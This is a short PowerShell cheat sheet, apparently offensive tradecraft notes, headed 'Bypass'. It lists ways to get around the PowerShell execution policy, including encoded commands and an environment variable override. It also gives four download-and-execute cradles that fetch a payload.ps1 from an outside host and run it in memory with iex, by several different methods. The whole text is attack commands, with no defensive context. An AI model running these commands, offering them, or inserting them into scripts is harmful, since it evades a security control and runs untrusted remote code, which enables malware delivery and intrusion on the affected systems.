#Bypass

powershell -executionpolicy bypass
powershell -c <cmd>
powershell -encodedcommand
$env:psexecutionpolicypreference="bypass"

iex (New-Object net.webClient).DownloadString('http://tenaka.net/payload.ps1')
iex (iwr 'http://tenaka.net/payload.ps1')

$web = New-Object -ComObject
msxml2.xmlhttp;$web.open('get','http://tenaka.net/payload.ps1',$false);$web.send();iex

$web = [System.Net.WebRequest]::create("http://tenaka.net/payload.ps1")
$resp = $web.getResponse()
iex([System.IO.StreamReader]($resp.getResponseStream())).ReadToEnd()